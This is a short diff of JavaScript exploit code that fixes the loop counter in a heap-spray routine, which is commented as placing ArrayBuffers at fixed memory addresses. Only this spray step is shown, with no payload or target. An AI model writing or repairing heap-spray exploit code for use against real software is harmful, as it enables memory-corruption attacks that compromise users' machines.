@@ -203,7 +203,7 @@ for(var i1 = 1; i1 < 0x3000; i1++){
 }
 
 // heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048
-for(var i1 = 1; i1 < spraynum; i++){
+for(var i1 = 1; i1 < spraynum; i1++){
     sprayarr[i1] = new ArrayBuffer(spraylen);
 }
 
